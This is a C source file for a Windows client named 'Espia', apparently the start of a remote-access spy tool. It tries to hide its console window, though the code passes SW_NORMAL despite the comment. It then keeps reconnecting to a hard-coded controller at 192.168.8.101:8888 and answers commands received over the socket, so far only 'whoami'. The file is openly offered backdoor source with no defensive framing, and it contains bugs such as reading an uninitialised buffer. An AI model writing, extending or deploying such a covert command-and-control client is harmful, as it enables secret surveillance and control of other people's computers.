#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h> 
#include <stdio.h>
#include "Espia/includes/espia.h"

#define TRY_SERVER 5
#define BUFF_SIZE 1024

int main() {
    /* Allocate a new console and hide it (SW_HIDE) */
	HWND stealth;           
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_NORMAL);
    /* ------------------------------------------- */


    /* Keep trying to connect to the server */
	WORD server_status;
	SOCKET connection;
	while ((server_status = espia_connect("192.168.8.101", "8888", &connection)) == CONNECTION_FAIL)
		Sleep(TRY_SERVER);
    /* ------------------------------------ */


    /* Main flow of the program, command recieving, parsing */
    CHAR recv_buff[BUFF_SIZE];
    CHAR send_buff[BUFF_SIZE];
    memset(send_buff, 0, BUFF_SIZE);
    int cmd_size = -1;
    while (strcmp(recv_buff, "exit") || cmd_size != 0) {
        memset(recv_buff, 0, BUFF_SIZE);
        cmd_size = espia_recv(&connection, recv_buff, BUFF_SIZE);
        memset(recv_buff + cmd_size - 1, 0, 1);

        if (strcmp(recv_buff, "whoami") == 0) {
            whoami(send_buff, BUFF_SIZE);
            espia_send(&connection, send_buff, BUFF_SIZE);
        }
    }
    /* ---------------------------------------------------- */


    /* Disconnecting from the server */
	espia_disconnect(&connection);
    /* ----------------------------- */

	return 0;
}